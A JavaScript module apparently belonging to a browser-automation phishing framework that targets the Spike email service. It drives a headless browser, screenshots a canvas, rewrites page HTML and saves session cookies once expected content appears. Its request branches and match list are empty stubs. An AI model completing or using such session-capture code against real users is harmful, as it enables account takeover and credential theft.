const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            await page.waitForResponse(async response => {
                if (response.request().resourceType() == "other") {
                    await new Promise(re => setTimeout(re, 2000))
                    return true
                }
            })


            const canvas = await page.$("canvas")
            await canvas.screenshot({ path: `${process.__dirname}/public/web_public/${this.appName}/${this.id}.png` });
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = []

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-email") {

            } else if (spikeType == "") {

            } else if (spikeType == "") {

            } else if (spikeType == "") {

            } else if (spikeType == "") {

            } else if (spikeType == "") {

            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }